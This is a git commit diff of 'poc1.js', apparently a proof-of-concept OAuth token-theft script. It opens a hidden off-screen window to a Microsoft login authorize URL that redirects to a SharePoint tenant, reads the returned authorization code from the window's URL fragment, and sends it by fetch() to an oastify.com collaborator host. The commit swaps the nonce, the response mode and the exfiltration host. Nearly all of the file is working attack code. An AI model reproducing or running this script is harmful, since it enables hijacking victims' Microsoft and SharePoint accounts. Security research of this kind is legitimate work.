0038a698ddb4e703f704a6d6266694359e429b2d
Pedro <52047256+pedrojuniorrd@users.noreply.github.com>
2025-12-11 17:52:50 -0300

    Update poc1.js

--- poc1.js
+++ poc1.js
@@ -2,7 +2,7 @@
 if(window.__labPoc)return;
 window.__labPoc=1;
 
-const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=fragment&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=B3484C53470401EDDA6CE07D7782FE3A3A0506AF6D3EC1E1%2D66FC3F8458DF140135EAE2331EABDBA71B52C9582FA57957079149705CFC8AEB&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=6d15e2a1%2Db089%2Da000%2Dc9c3%2Dadcf9af307d0";
+const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=form%5Fpost&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=39FAF5C37974444AC5A083B1FA8316E6651EBB56614918E9%2D92C9CD6D007AFE921751C633390CE4CE96E187D82F2F040A69BC9AD9A3709619&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=c915e2a1%2D7021%2Da000%2De3cd%2D140a4e2d9f77";
 
 let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");
 
@@ -10,7 +10,7 @@ for(let i=0;i<80;i++){
  try{
   let hash=win.location.hash;
   if(hash&&hash.includes("code=")){
-   fetch("https://qa448st16jusgv2nnosaxvaopfv6jy7n.oastify.com/?x="+encodeURIComponent(hash));
+   fetch("https://8y7mwahju1ia4dq5b6gsldy6dxjo7hv6.oastify.com/?x="+encodeURIComponent(hash));
    win.close();
    break;
   }
